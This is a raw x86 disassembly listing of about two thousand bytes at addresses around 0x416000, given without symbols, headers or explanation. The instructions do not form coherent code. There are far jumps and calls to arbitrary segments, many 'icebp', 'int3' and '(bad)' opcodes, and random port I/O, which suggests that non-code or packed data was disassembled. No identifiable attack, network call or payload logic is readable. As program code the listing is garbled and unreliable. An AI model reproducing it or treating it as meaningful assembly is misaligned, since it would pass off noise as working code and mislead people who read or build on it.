  41609f:	shr    ecx,cl
  4160a1:	jmp    0x2b95:0x2efbadd5
  4160a8:	pop    esi
  4160a9:	or     eax,0xa7697bde
  4160ae:	dec    edx
  4160af:	out    0x8,eax
  4160b1:	xor    BYTE PTR [ebx+ebp*4-0x54],bh
  4160b5:	pop    ds
  4160b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b7:	mov    dh,0x5a
  4160b9:	jmp    esp
  4160bb:	jbe    0x41607b
  4160bd:	mov    ebp,0xabf8e1e6
  4160c2:	and    al,cl
  4160c4:	fmul   DWORD PTR [ebp+0x3d8e362b]
  4160ca:	xchg   BYTE PTR [ecx-0x7afc8450],dh
  4160d0:	int    0x26
  4160d2:	int3   
  4160d3:	sub    BYTE PTR [eax+edx*2+0x3e238dab],dl
  4160da:	lods   eax,DWORD PTR ds:[esi]
  4160db:	pop    esi
  4160dc:	or     dh,bh
  4160de:	pop    ds
  4160df:	or     ebx,edx
  4160e1:	sub    eax,0xcfab9d10
  4160e6:	shr    BYTE PTR [edx],0x71
  4160e9:	mov    ah,0xe0
  4160eb:	cli    
  4160ec:	pcmpeqw mm6,QWORD PTR [ecx-0x7926b32f]
  4160f3:	pop    ebx
  4160f4:	add    BYTE PTR [edx+0x20],ah
  4160f7:	inc    eax
  4160f8:	dec    edx
  4160f9:	icebp  
  4160fa:	push   ds
  4160fb:	xlat   BYTE PTR ds:[ebx]
  4160fc:	inc    eax
  4160fd:	imul   ebp,edx,0xffffffa7
  416100:	jne    0x416110
  416102:	push   esp
  416103:	pop    eax
  416104:	or     BYTE PTR [ebp-0x3e670c79],bl
  41610a:	ret    0xb90e
  41610d:	cwde   
  41610e:	add    eax,0xdc9dfa29
  416113:	jmp    0xc591:0xff3f3409
  41611a:	jle    0x416128
  41611c:	xor    al,dh
  41611e:	enter  0xb8c3,0xfe
  416122:	out    0x58,al
  416124:	push   eax
  416125:	xor    ah,BYTE PTR [eax-0x35c7337e]
  41612b:	fstp   TBYTE PTR ds:0x7c18681
  416131:	icebp  
  416132:	sbb    bh,BYTE PTR [ecx]
  416134:	push   esi
  416135:	mov    es,eax
  416137:	dec    ebx
  416138:	in     al,dx
  416139:	mov    dl,0x8d
  41613b:	lods   al,BYTE PTR ds:[esi]
  41613c:	scas   eax,DWORD PTR es:[edi]
  41613d:	xchg   edx,eax
  41613e:	call   0xa328:0xbff03db
  416145:	icebp  
  416146:	inc    esi
  416147:	ins    DWORD PTR es:[edi],dx
  416148:	lock push esp
  41614a:	dec    eax
  41614b:	test   BYTE PTR [edi+0x24],0x29
  41614f:	into   
  416150:	cwde   
  416151:	or     eax,DWORD PTR [esi-0x235b7795]
  416157:	repz push es
  416159:	icebp  
  41615a:	jle    0x41611e
  41615c:	xlat   BYTE PTR ds:[ebx]
  41615d:	mov    DWORD PTR [ebp+0x7e],esp
  416160:	jl     0x4160fe
  416162:	js     0x416122
  416164:	mov    BYTE PTR [ecx-0x3877d079],0x33
  41616b:	js     0x416146
  41616d:	xchg   esp,eax
  41616e:	cld    
  41616f:	sub    DWORD PTR [edi-0x54],edi
  416172:	pushf  
  416173:	pop    edi
  416174:	mul    DWORD PTR [ebp+0x21]
  416177:	sbb    esi,DWORD PTR ds:0x19f444fa
  41617d:	icebp  
  41617e:	jp     0x4161f8
  416180:	mov    edi,DWORD PTR [esi]
  416182:	cdq    
  416183:	add    ebp,DWORD PTR [esi+0x43]
  416186:	call   0x707:0x873dc286
  41618d:	mov    al,0x8a
  41618f:	sbb    eax,0x292c1115
  416194:	int3   
  416195:	mov    ds:0x2855e00a,al
  41619a:	and    dl,cl
  41619c:	or     dh,bl
  41619e:	sbb    DWORD PTR [ebp-0x79],ecx
  4161a1:	in     eax,dx
  4161a2:	push   ss
  4161a3:	(bad)  [edi-0x80]
  4161a6:	or     al,0x28
  4161a8:	push   ss
  4161a9:	fisttp QWORD PTR [esi+0x26]
  4161ac:	ss push 0x14
  4161af:	xor    BYTE PTR [ecx],cl
  4161b1:	mov    ecx,0xe26d524
  4161b6:	fcom   QWORD PTR [ecx+ecx*1-0x27]
  4161ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161bb:	sub    BYTE PTR [edi+0x44],ah
  4161be:	nop
  4161bf:	push   ebp
  4161c0:	loope  0x4161f6
  4161c2:	cld    
  4161c3:	sub    eax,0x7b9b1bf9
  4161c8:	and    DWORD PTR [esi],0x4
  4161cb:	jmp    0xb241:0x4677adb0
  4161d2:	add    al,0x2d
  4161d4:	pop    es
  4161d5:	ss into 
  4161d7:	adc    eax,0xff07f1aa
  4161dc:	mov    edi,0x9fd7860b
  4161e1:	jmp    0x416206
  4161e3:	scas   eax,DWORD PTR es:[edi]
  4161e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e5:	(bad)  
  4161e6:	imul   DWORD PTR [ecx]
  4161e8:	mov    ebp,0x61b911d1
  4161ed:	jno    0x416255
  4161ef:	bound  edx,QWORD PTR [edx-0x10]
  4161f2:	sar    al,cl
  4161f4:	push   eax
  4161f5:	sti    
  4161f6:	popa   
  4161f7:	and    BYTE PTR [ebp+0x1],dl
  4161fa:	pusha  
  4161fb:	xor    DWORD PTR [edx-0x481e782d],ebx
  416201:	pop    es
  416202:	bound  esp,QWORD PTR [edi]
  416204:	xchg   edi,eax
  416205:	sub    eax,0xb1572663
  41620a:	das    
  41620b:	bound  ecx,QWORD PTR [esi+0x34]
  41620e:	loop   0x4161b4
  416210:	inc    ecx
  416211:	push   esp
  416212:	xchg   bh,al
  416214:	mov    cl,BYTE PTR ds:0x4e9fce7c
  41621a:	imul   DWORD PTR [eax]
  41621c:	test   BYTE PTR [edi-0x314614e4],ch
  416222:	sbb    ch,bl
  416224:	pop    ds
  416225:	clc    
  416226:	into   
  416227:	sub    dl,bl
  416229:	ins    DWORD PTR es:[edi],dx
  41622a:	das    
  41622b:	mov    al,ds:0xde9bdab4
  416230:	or     BYTE PTR [eax+0x2facf737],bl
  416236:	inc    esp
  416237:	js     0x416240
  416239:	repz cmp bh,0x8b
  41623d:	gs fs xchg ecx,eax
  416240:	loop   0x4162ba
  416242:	popa   
  416243:	lock adc eax,0xdff7797e
  416249:	mov    al,0x24
  41624b:	sub    DWORD PTR [ebx+0x2c],0xe507338d
  416252:	or     eax,0xb0c8c524
  416257:	mov    bl,0x9
  416259:	enter  0xbd67,0xb3
  41625d:	cmp    bh,bl
  41625f:	inc    esi
  416260:	call   0x28f1:0x4e57560c
  416267:	rcl    BYTE PTR [ebx-0x2c5d6313],cl
  41626d:	ja     0x4161f2
  41626f:	and    al,dh
  416271:	jp     0x41622f
  416273:	xor    eax,0x7a06f36b
  416278:	sub    dh,bh
  41627a:	adc    al,0x5e
  41627c:	pop    eax
  41627d:	xor    ch,BYTE PTR [ebp-0x591aa880]
  416283:	xor    eax,0x82b8ea09
  416288:	fcmovnu st,st(7)
  41628a:	add    DWORD PTR [edx],esp
  41628c:	xlat   BYTE PTR ds:[ebx]
  41628d:	icebp  
  41628e:	bound  edx,QWORD PTR [eax]
  416290:	cmp    eax,ebp
  416292:	inc    ebx
  416293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416294:	cld    
  416295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416296:	xor    DWORD PTR [edx+ebp*2-0x2c],ebx
  41629a:	xchg   BYTE PTR [ebx+0x78],bh
  41629d:	xor    BYTE PTR [edx-0x37608e75],0x29
  4162a4:	fmul   st,st(6)
  4162a6:	addr16 icebp 
  4162a8:	xor    ah,BYTE PTR [eax-0x3df6b0d1]
  4162ae:	mov    BYTE PTR [ecx+0x3062c119],bh
  4162b4:	in     eax,dx
  4162b5:	dec    ecx
  4162b6:	mov    ds:0xd1089b0f,eax
  4162bb:	sub    eax,0x6b453277
  4162c0:	adc    dh,al
  4162c2:	icebp  
  4162c3:	in     eax,dx
  4162c4:	std    
  4162c5:	cmp    eax,0x8fb1e06a
  4162ca:	push   ds
  4162cb:	sub    BYTE PTR [esi-0x72],cl
  4162ce:	mov    ebp,0xc6e3c86d
  4162d3:	inc    edi
  4162d4:	add    dl,bl
  4162d6:	imul   edi,DWORD PTR [ebx-0x20],0x2b
  4162da:	mov    bh,0x65
  4162dc:	adc    al,BYTE PTR [edi-0x79]
  4162df:	push   eax
  4162e0:	(bad)  
  4162e1:	call   0xfbd48d95
  4162e6:	nop
  4162e7:	or     BYTE PTR [edx-0x3e569a89],ah
  4162ed:	not    esi
  4162ef:	lds    ebp,FWORD PTR [ecx+esi*8-0x76391ae2]
  4162f6:	ret    0x5523
  4162f9:	lods   al,BYTE PTR ds:[esi]
  4162fa:	adc    BYTE PTR [edx],cl
  4162fc:	mov    dh,al
  4162fe:	sub    BYTE PTR [ecx+0x44c7d1a2],al
  416304:	jmp    0x86d4:0x526149a
  41630b:	cmp    eax,DWORD PTR [ebp-0x44]
  41630e:	cmp    DWORD PTR [esi+eiz*4+0x71],ebp
  416312:	mov    al,0xe9
  416314:	in     al,0x63
  416316:	or     dl,BYTE PTR [ecx+0x2d86b982]
  41631c:	je     0x416303
  41631e:	push   esp
  41631f:	mov    ebp,0x29c9ec57
  416324:	sti    
  416325:	dec    eax
  416326:	sahf   
  416327:	dec    esp
  416328:	push   cs
  416329:	call   0xe00f:0xab6bd388
  416330:	dec    ebx
  416331:	sub    BYTE PTR [ebp-0x7b0f9b02],0xad
  416338:	and    edi,DWORD PTR [eax+0x2806806c]
  41633e:	(bad)
  416342:	xchg   edi,ebp
  416344:	jl     0x4162f9
  416346:	nop
  416347:	dec    esp
  416348:	mov    ebp,0x5629087c
  41634d:	sbb    BYTE PTR [ebp+0x69],0x9
  416351:	into   
  416352:	fidivr WORD PTR [eax+0x30]
  416355:	push   cs
  416356:	das    
  416357:	jg     0x4163ce
  416359:	retf   0x1b68
  41635c:	xchg   ebx,eax
  41635d:	mov    ds:0x6e9ca881,al
  416362:	mov    edx,0x7686081e
  416367:	xchg   esp,eax
  416368:	push   0xffffffd1
  41636a:	mov    ch,BYTE PTR [ebp-0x4]
  41636d:	icebp  
  41636e:	fidivr WORD PTR ds:0x12944952
  416374:	xchg   esp,eax
  416375:	out    0x57,al
  416377:	or     DWORD PTR ss:[edx+0x57],esp
  41637b:	xchg   edx,eax
  41637c:	adc    bl,bl
  41637e:	jnp    0x41633a
  416380:	xor    ecx,esi
  416382:	mov    al,ds:0x2fa544af
  416387:	into   
  416388:	arpl   WORD PTR [ecx-0x5a],dx
  41638b:	rcl    BYTE PTR [eax-0x3c2788c],1
  416391:	ds cmp al,0x1e
  416394:	mov    ds:0x63af37a,eax
  416399:	out    0x33,al
  41639b:	scas   eax,DWORD PTR es:[edi]
  41639c:	mov    bh,0x58
  41639e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41639f:	dec    ecx
  4163a0:	or     eax,ecx
  4163a2:	add    esi,ebx
  4163a4:	scas   eax,DWORD PTR es:[edi]
  4163a5:	and    al,0xad
  4163a7:	inc    ebx
  4163a8:	loopne 0x4163d2
  4163aa:	mov    edi,0x5c750329
  4163af:	sub    DWORD PTR [edx-0x57],ebx
  4163b2:	xchg   esp,eax
  4163b3:	pop    es
  4163b4:	imul   ebp
  4163b6:	sbb    al,0x26
  4163b8:	xchg   edi,eax
  4163b9:	test   DWORD PTR [ecx+0x7d],esi
  4163bc:	ret    
  4163bd:	test   DWORD PTR [esi-0x67a1f0cc],0x548789e2
  4163c7:	(bad)  
  4163c8:	not    BYTE PTR [esi]
  4163ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163cb:	idiv   BYTE PTR [ecx+0x231798fa]
  4163d1:	xor    BYTE PTR [ebp-0x3aa43896],bh
  4163d7:	arpl   WORD PTR [edi+0x35],cx
  4163da:	inc    eax
  4163db:	sub    DWORD PTR [eax],esp
  4163dd:	nop
  4163de:	fwait
  4163df:	mov    edi,0xa4a6d409
  4163e4:	cmp    bl,ah
  4163e6:	test   BYTE PTR ds:0xd38ef13d,al
  4163ec:	xchg   BYTE PTR [edi-0x63f8e158],bl
  4163f2:	outs   dx,BYTE PTR ds:[esi]
  4163f3:	jl     0x4163fd
  4163f5:	les    esi,FWORD PTR [edx+0x53]
  4163f8:	cwde   
  4163f9:	adc    eax,0xf042cc69
  4163fe:	pushf  
  4163ff:	fcom   st(3)
  416401:	adc    DWORD PTR [edi],eax
  416403:	mov    ds:0x8a61ca1,al
  416408:	pop    ss
  416409:	into   
  41640a:	retf   0xf899
  41640d:	and    eax,0x20123587
  416412:	add    DWORD PTR [edx],ecx
  416414:	jns    0x416488
  416416:	sub    DWORD PTR gs:[edi+ecx*2-0x78],esp
  41641b:	xor    cl,BYTE PTR [edi]
  41641d:	sahf   
  41641e:	pop    ss
  41641f:	sub    esi,0x501f5362
  416425:	call   0x2949:0xc1b719bc
  41642c:	(bad)  
  41642d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41642e:	sti    
  41642f:	shl    bh,1
  416431:	int    0x7f
  416433:	cmp    edi,esp
  416435:	jae    0x4163ea
  416437:	out    0xe4,eax
  416439:	test   al,0xe
  41643b:	or     al,0x57
  41643d:	icebp  
  41643e:	add    bh,dl
  416440:	hlt    
  416441:	pop    es
  416442:	stos   DWORD PTR es:[edi],eax
  416443:	inc    ecx
  416444:	or     al,al
  416446:	or     al,0x95
  416448:	stc    
  416449:	daa    
  41644a:	jmp    0xdb0f1ed4
  41644f:	cli    
  416450:	js     0x416443
  416452:	retf   0x8c0f
  416455:	sbb    al,0x41
  416457:	out    0xf7,eax
  416459:	xchg   ecx,eax
  41645a:	push   esi
  41645b:	dec    esp
  41645c:	push   cs
  41645d:	enter  0xafa,0x35
  416461:	aad    0x22
  416463:	dec    esi
  416464:	fs icebp 
  416466:	enter  0xa3c9,0xc3
  41646a:	fidivr WORD PTR [esi+0x511a1608]
  416470:	jge    0x41645c
  416472:	ins    BYTE PTR es:[edi],dx
  416473:	out    dx,al
  416474:	ja     0x416466
  416476:	fdiv   DWORD PTR [ebp+0x41c9bb5f]
  41647c:	or     bl,BYTE PTR [ebx-0x43]
  41647f:	adc    BYTE PTR [esi-0xd],cl
  416482:	stc    
  416483:	adc    cl,BYTE PTR gs:[esi+ecx*8]
  416487:	retf   
  416488:	jl     0x416488
  41648a:	fadd   DWORD PTR [ebx+0x18]
  41648d:	icebp  
  41648e:	(bad)
  416491:	jo     0x4164fc
  416493:	into   
  416494:	repnz pop DWORD PTR [edi+0x9e61a3b]
  41649b:	ins    BYTE PTR es:[edi],dx
  41649c:	xchg   edi,eax
  41649d:	xor    DWORD PTR [edi+0x4053ec28],ebx
  4164a3:	sbb    esi,DWORD PTR [esi+0x6]
  4164a6:	lea    esi,[ecx+0xf73ae58]
  4164ac:	xchg   edi,eax
  4164ad:	ret    
  4164ae:	xchg   cl,ch
  4164b0:	jo     0x41643d
  4164b2:	sbb    ch,BYTE PTR [esi+edx*1]
  4164b5:	icebp  
  4164b6:	push   ebx
  4164b7:	inc    ecx
  4164b8:	or     DWORD PTR [esi+0x6ba2f3cf],edi
  4164be:	mov    ebx,0x8723232f
  4164c3:	jne    0x4164e7
  4164c5:	or     eax,0x1cfdb68a
  4164ca:	xor    DWORD PTR [ecx+0x61],esp
  4164cd:	ror    DWORD PTR [edi],1
  4164cf:	das    
  4164d0:	call   0x8be4810
  4164d5:	sbb    al,0x92
  4164d7:	xchg   edx,esi
  4164d9:	xor    DWORD PTR [ebx+0x55],esp
  4164dc:	mov    eax,0xdc8ba8f4
  4164e1:	fimul  WORD PTR [edi+0x4e]
  4164e4:	leave  
  4164e5:	add    BYTE PTR [ecx],al
  4164e7:	mov    bh,0xd
  4164e9:	mov    WORD PTR [ebx-0x6818d39c],ds
  4164ef:	sbb    eax,0xd8c35d71
  4164f4:	shr    DWORD PTR [eax-0x6373d740],0xb5
  4164fb:	jno    0x416519
  4164fd:	sub    BYTE PTR [ebx],ah
  4164ff:	(bad)  
  416500:	das    
  416501:	mov    cl,0x27
  416503:	xor    BYTE PTR cs:[ecx-0x66],0xc3
  416508:	int    0x73
  41650a:	das    
  41650b:	mov    edx,0xc1e0f31f
  416510:	ret    0x9dfc
  416513:	xchg   BYTE PTR [edi+0x2a],dl
  416516:	jmp    0x7d244ad3
  41651b:	cwde   
  41651c:	xchg   BYTE PTR [eax-0x7a],dl
  41651f:	aad    0x20
  416521:	and    edi,esi
  416523:	mov    cl,0x7b
  416525:	out    0xf8,eax
  416527:	sub    DWORD PTR [edi],ebx
  416529:	mov    cl,0x70
  41652b:	jb     0x416536
  41652d:	pop    esp
  41652e:	adc    ch,BYTE PTR [edx-0x2e3c2b88]
  416534:	aaa    
  416535:	lock fiadd DWORD PTR [ecx-0x15bd7577]
  41653c:	inc    BYTE PTR [ebx]
  41653e:	jbe    0x416500
  416540:	xchg   edx,eax
  416541:	xchg   BYTE PTR cs:[ebx-0xeea1c54],ah
  416548:	scas   eax,DWORD PTR es:[edi]
  416549:	xchg   ecx,eax
  41654a:	or     BYTE PTR [eax],ch
  41654c:	in     eax,dx
  41654d:	inc    esp
  41654e:	and    dl,BYTE PTR [ecx+0x9]
  416551:	mov    ds:0x38ce04de,al
  416556:	jmp    0x25de:0x343f80d7
  41655d:	or     BYTE PTR [ecx-0x7cc537d8],cl
  416563:	and    cl,BYTE PTR [ecx]
  416565:	mov    BYTE PTR [edx+0x1319b2f2],bh
  41656b:	rol    dh,0x8
  41656e:	sub    eax,0x42ee832e
  416573:	sub    BYTE PTR [edx+eiz*4+0x1e],ah
  416577:	fincstp 
  416579:	inc    ecx
  41657a:	pop    esi
  41657b:	cmp    BYTE PTR [esi-0x47834697],ch
  416581:	icebp  
  416582:	clc    
  416583:	xchg   edi,eax
  416584:	mov    ebx,0xf686706f
  416589:	test   eax,0xe159f92a
  41658e:	xchg   bl,dl
  416590:	aas    
  416591:	ins    BYTE PTR es:[edi],dx
  416592:	mov    ds:0x51159f5b,eax
  416597:	sub    dh,ah
  416599:	sahf   
  41659a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41659b:	in     eax,dx
  41659c:	imul   DWORD PTR [ebp-0x38709ab6]
  4165a2:	push   esp
  4165a3:	add    BYTE PTR [ecx-0x10],dh
  4165a6:	sub    al,0xae
  4165a8:	or     edx,DWORD PTR [esi+0x452ac75d]
  4165ae:	xchg   ebx,eax
  4165af:	loop   0x41656d
  4165b1:	xchg   ch,bh
  4165b3:	dec    ebp
  4165b4:	add    edi,ebx
  4165b6:	mov    ds:0x43140826,al
  4165bb:	(bad)  
  4165bd:	lock fiadd DWORD PTR [edi+edi*4]
  4165c1:	cmp    al,0xa3
  4165c3:	cmp    edi,DWORD PTR [ecx*4+0x5a0928c3]
  4165ca:	jo     0x4165a7
  4165cc:	mov    edi,DWORD PTR [eax+eiz*1-0x250142c9]
  4165d3:	mov    ebp,0xc52a635f
  4165d8:	jge    0x4165c5
  4165da:	in     al,0xc8
  4165dc:	or     BYTE PTR [eax-0x7c4e025f],dh
  4165e2:	mov    eax,0x32611b11
  4165e7:	pop    es
  4165e8:	cld    
  4165e9:	repnz into 
  4165eb:	and    eax,0xd0ee8bc3
  4165f0:	pushw  ss
  4165f2:	ins    DWORD PTR es:[edi],dx
  4165f3:	xchg   esi,eax
  4165f4:	dec    edi
  4165f5:	jg     0x416630
  4165f7:	mov    BYTE PTR [ecx],cl
  4165f9:	mov    edx,0x767d4b3a
  4165fe:	mov    esi,cs
  416600:	lahf   
  416601:	jno    0x416682
  416603:	loopne 0x4165c8
  416605:	icebp  
  416606:	outs   dx,BYTE PTR ds:[esi]
  416607:	sub    esp,DWORD PTR [edx-0x4a7ddbd]
  41660d:	rol    BYTE PTR [edi],cl
  41660f:	outs   dx,DWORD PTR ds:[esi]
  416610:	loope  0x4165f2
  416612:	push   0xffffffcc
  416614:	jmp    0x88cc:0x43838687
  41661b:	xchg   ebp,eax
  41661c:	loope  0x416611
  41661e:	pop    edx
  41661f:	sub    BYTE PTR [ebx],cl
  416621:	mov    gs,WORD PTR [ecx+0x7f]
  416624:	or     BYTE PTR [eax+0x7f24c850],ah
  41662a:	mov    WORD PTR [edx+0x6f460ddc],ss
  416630:	push   ebx
  416631:	in     eax,dx
  416632:	aad    0x29
  416634:	mov    cl,0x31
  416636:	mov    ebp,0x1d783455
  41663b:	jno    0x416653
  41663d:	pop    eax
  41663e:	mov    WORD PTR [ecx+0x272032bd],fs
  416644:	mov    eax,ds:0x6a58241a
  416649:	lock out 0x45,al
  41664c:	add    al,0x12
  41664e:	retf   0x8412
  416651:	sub    esp,DWORD PTR [ecx-0xb]
  416654:	push   ebx
  416655:	repnz push edx
  416657:	xor    BYTE PTR [ecx],cl
  416659:	inc    edx
  41665a:	sbb    esi,DWORD PTR [ebp-0x5e8c2e38]
  416660:	xor    ecx,DWORD PTR [ecx-0x80]
  416663:	sub    DWORD PTR [edi-0x76],edx
  416666:	push   cs
  416667:	jp     0x416691
  416669:	push   DWORD PTR [esp+eiz*4-0x5b]
  41666d:	(bad)  
  41666e:	sti    
  41666f:	iret   
  416670:	ror    DWORD PTR [ecx-0x1688602d],0xcc
  416677:	cmp    DWORD PTR [edx+0x463ef0f0],edi
  41667d:	std    
  41667e:	pusha  
  41667f:	popa   
  416680:	ret    
  416681:	cmp    ebx,DWORD PTR [eax]
  416683:	push   0xa7866173
  416688:	ds push ds
  41668a:	sbb    ebx,esi
  41668c:	imul   edi,DWORD PTR [ebp-0x35],0x2d665828
  416693:	lahf   
  416694:	or     DWORD PTR [esi+eax*1-0x52],edx
  416698:	fisubr WORD PTR [eax]
  41669a:	das    
  41669b:	jns    0x416681
  41669d:	icebp  
  41669e:	int3   
  41669f:	push   0x5b287053
  4166a4:	jnp    0x41670e
  4166a6:	mov    ds:0x87fccb0f,eax
  4166ab:	inc    edi
  4166ac:	jg     0x41672a
  4166ae:	add    esp,eax
  4166b0:	out    0x7,eax
  4166b2:	pushf  
  4166b3:	adc    esi,esi
  4166b5:	out    dx,eax
  4166b6:	fwait
  4166b7:	mov    edx,0xf4860f80
  4166bc:	or     BYTE PTR [eax+0x5e],ch
  4166bf:	out    0xbb,eax
  4166c1:	repz in al,0xbc
  4166c4:	scas   al,BYTE PTR es:[edi]
  4166c5:	icebp  
  4166c6:	call   0xd114:0xac47a941
  4166cd:	test   DWORD PTR [ecx-0x79ceb157],0xa34130a7
  4166d7:	test   al,0xdd
  4166d9:	mov    ds:0xf37b2923,eax
  4166de:	js     0x4166ac
  4166e0:	or     DWORD PTR [eax-0x4f],ebx
  4166e3:	mov    ds,WORD PTR [ebx+eiz*1+0x54]
  4166e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e8:	or     eax,0x439e6980
  4166ed:	icebp  
  4166ee:	inc    edx
  4166ef:	in     eax,0xba
  4166f1:	(bad)  
  4166f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166f3:	call   0x122d4b90
  4166f8:	inc    edx
  4166f9:	loopne 0x41667e
  4166fb:	das    
  4166fc:	lods   al,BYTE PTR ds:[esi]
  4166fd:	jno    0x4166df
  4166ff:	inc    edi
  416700:	popa   
  416701:	lock (bad) 
  416703:	or     BYTE PTR [edi-0x64],0x8a
  416707:	cs dec ebp
  416709:	ja     0x4166b9
  41670b:	jmp    0x5690:0x5eb7f5f7
  416712:	bound  eax,QWORD PTR [ebp+0x3c]
  416715:	lock int3 
  416717:	stos   BYTE PTR es:[edi],al
  416718:	aam    0xfc
  41671a:	fcomip st,st(3)
  41671c:	push   ebx
  41671d:	(bad)  
  41671e:	xor    eax,0x86a6837b
  416723:	pop    ds
  416724:	and    eax,0x4dd6e2cf
  416729:	stos   DWORD PTR es:[edi],eax
  41672a:	retf   
  41672b:	sub    DWORD PTR [eax-0x7c],esi
  41672e:	ins    BYTE PTR es:[edi],dx
  41672f:	sbb    cl,BYTE PTR [eax]
  416731:	into   
  416732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416733:	cmp    ebx,DWORD PTR [eax+0x7]
  416736:	inc    ecx
  416737:	(bad)  
  416738:	stc    
  416739:	pop    ds
  41673a:	add    cl,bh
  41673c:	mov    eax,ds:0x2e1353c9
  416741:	retf   
  416742:	dec    edx
  416743:	sub    ecx,DWORD PTR [edx+0x1f3eed78]
  416749:	sbb    BYTE PTR [ebx-0x190f430b],ch
  41674f:	test   DWORD PTR [ecx+0x3a],ebx
  416752:	jb     0x416723
  416754:	out    0x98,eax
  416756:	mov    ch,0x29
  416758:	lods   al,BYTE PTR ds:[esi]
  416759:	std    
  41675a:	mov    cl,0x55
  41675c:	or     BYTE PTR [eax-0x5639b435],al
  416762:	dec    eax
  416763:	jg     0x41677f
  416765:	icebp  
  416766:	je     0x416793
  416768:	int3   
  416769:	lds    esp,FWORD PTR [ebp+0x27747c6]
  41676f:	jmp    0x41679e
  416771:	fiadd  DWORD PTR [esi+0x7e703b23]
  416777:	cwde   
  416778:	shl    ebx,cl
  41677a:	cli    
  41677b:	xor    al,0x88
  41677d:	sahf   
  41677e:	and    cl,BYTE PTR [ecx-0x60]
  416781:	ds sub eax,0x87cdefbb
  416787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416789:	repz jb 0x4167f6
  41678c:	popf   
  41678d:	das    
  41678e:	imul   ebp,DWORD PTR [eax],0x6e916fff
  416794:	or     DWORD PTR [esi+0x3fd2f4f4],esp
  41679a:	stos   BYTE PTR es:[edi],al
  41679b:	jb     0x416746
  41679d:	icebp  
  41679e:	ds stos DWORD PTR es:[edi],eax
  4167a0:	inc    esi
  4167a1:	jl     0x416759
  4167a3:	jmp    0xe69d:0xd807932a
  4167aa:	xchg   ch,bl
  4167ac:	out    0xaf,al
  4167ae:	icebp  
  4167af:	dec    esp
  4167b0:	add    ebx,DWORD PTR [esi+eax*8-0x10c7a7d3]
  4167b7:	fistp  QWORD PTR [esi]
  4167b9:	or     DWORD PTR [edi],eax
  4167bb:	mov    al,ds:0x3f865bc5
  4167c0:	inc    ecx
  4167c1:	xor    eax,0xefcf092a
  4167c6:	jbe    0x4167c1
  4167c8:	mov    esi,DWORD PTR [eax]
  4167ca:	rol    DWORD PTR [esi+edi*1],0x4f
  4167ce:	push   es
  4167cf:	leave  
  4167d0:	adc    eax,0xd34ff99a
  4167d5:	xor    eax,0x302b7437
  4167da:	(bad)  
  4167db:	mov    ebp,0xa072f14a
  4167e0:	and    BYTE PTR [edx],0xd4
  4167e3:	hlt    
  4167e4:	push   0x67cd0ff
  4167e9:	int    0x86
  4167eb:	out    dx,eax
  4167ec:	mov    edi,0xf9945263
  4167f1:	(bad)  
  4167f3:	ja     0x41677c
  4167f5:	jge    0x4167f8
  4167f7:	push   es
  4167f8:	adc    al,0xe2
  4167fa:	pushf  
  4167fb:	cs inc edi
  4167fd:	lock pop edi
  4167ff:	adc    DWORD PTR [edi+0x1564f0db],ebx
  416805:	clc    
  416806:	push   ebx
  416807:	sysexit 
  416809:	pop    ss
  41680a:	int3   
  41680b:	sub    DWORD PTR [eax],edi
  41680d:	push   esi
  41680e:	fild   WORD PTR [esi]
  416810:	pop    eax
  416811:	bound  eax,QWORD PTR [edi-0x5acab2b7]
  416817:	xchg   bp,ax
  416819:	mov    ds:0x255d566a,al
  41681e:	xchg   BYTE PTR [esi],dh
  416820:	jno    0x416879
  416822:	ret    
  416823:	or     DWORD PTR [edx],ebp
  416825:	scas   al,BYTE PTR es:[edi]
  416826:	xchg   ecx,edx
  416828:	std    
  416829:	xor    DWORD PTR [edx],0x5
  41682c:	imul   esi,DWORD PTR [ecx+0x7062957],0xffffffee
  416833:	push   0xb
  416835:	dec    esi
  416836:	mov    BYTE PTR ss:[edi-0x5f782ab5],0xb
  41683e:	mov    edi,0x295c0503
  416843:	sub    DWORD PTR [edx+edx*8+0x1c0dbafd],ebp
  41684a:	xchg   edx,eax
  41684b:	and    ah,ch
  41684d:	loop   0x4168ad
  41684f:	arpl   WORD PTR [ebx+esi*2+0x7d],ax
  416853:	sub    ebp,esp
  416855:	in     eax,0x1e
  416857:	push   edx
  416858:	xor    DWORD PTR [ebx],eax
  41685a:	test   al,dh
  41685c:	std    
  41685d:	imul   ecx,ecx,0xb6b1f7e4
  416863:	push   esi
  416864:	in     eax,0x5b
  416866:	clc    
  416867:	hlt    
  416868:	or     dh,bh
  41686a:	sahf   
  41686b:	pop    ss
  41686c:	add    dl,ah
  41686e:	stos   DWORD PTR es:[edi],eax
  41686f:	mov    esi,0x1771cd27
  416874:	or     al,cl
  416876:	faddp  st(7),st
  416878:	or     esp,DWORD PTR [eax+edx*4+0x19]
  41687c:	xchg   ebx,eax
  41687d:	icebp  
  41687e:	inc    eax
  41687f:	lods   eax,DWORD PTR ds:[esi]
  416880:	mov    al,ds:0x3391f3f0
  416885:	jle    0x416882
  416887:	pop    esi
  416888:	fisttp QWORD PTR [edi+0x67]
  41688b:	stc    
  41688c:	mov    edi,0xe7b18628
  416891:	mov    esp,0x42657705
  416896:	mov    eax,ds:0xc1cf3029
  41689b:	mov    ecx,0x5911b890
  4168a0:	adc    al,0x50
  4168a2:	cmp    al,cl
  4168a4:	arpl   si,ax
  4168a6:	dec    esi
  4168a7:	xlat   BYTE PTR ds:[ebx]
  4168a8:	sbb    bh,BYTE PTR [ebx-0xf92a480]
  4168ae:	add    esp,DWORD PTR [edx-0x69]
  4168b1:	jp     0x4168b1
  4168b3:	cmp    dh,dl
  4168b5:	sub    al,BYTE PTR [esi+0x6618ceaf]
  4168bb:	jmp    0x4168ae
  4168bd:	icebp  
  4168be:	loop   0x4168a9
